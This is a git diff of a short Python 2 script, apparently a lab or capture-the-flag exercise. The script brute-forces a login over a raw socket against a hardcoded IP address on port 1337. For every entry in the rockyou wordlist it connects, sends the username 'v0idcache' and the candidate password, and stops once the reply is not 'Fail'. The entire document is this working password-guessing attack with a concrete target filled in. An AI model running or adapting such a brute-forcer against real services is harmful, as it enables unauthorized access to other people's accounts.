@@ -26,11 +26,35 @@
 
 import socket
 
-host = "" # IP address here
-port = 0000 # Port here
-wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
+host = "142.93.136.81" # IP address here
 
-def brute_force():
+wordlist = "rockyou.txt" # Point to wordlist file
+
+def brute_force(port):
+        # Receives 1024 bytes from IP/Port
+    file_object = open(wordlist, "r")
+    i = 1
+    for word in file_object:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+        data = s.recv(1024)
+        print(data)
+        s.send("v0idcache\n")
+        data = s.recv(1024)
+        print(data)
+        s.send(word)
+        data = s.recv(1024)
+        print(data)
+        if (data != "Fail\n"):
+            print(word)
+            break
+    
+
+    #data = s.recv(1024) 
+    #print(data)
+    #print(port)
+    
+
     """
         Sockets: https://docs.python.org/2/library/socket.html
         How to use the socket s:
@@ -62,4 +86,6 @@ def brute_force():
 
 
 if __name__ == '__main__':
-    brute_force()
+    ports = [1337]
+    for port in ports:
+        brute_force(port)
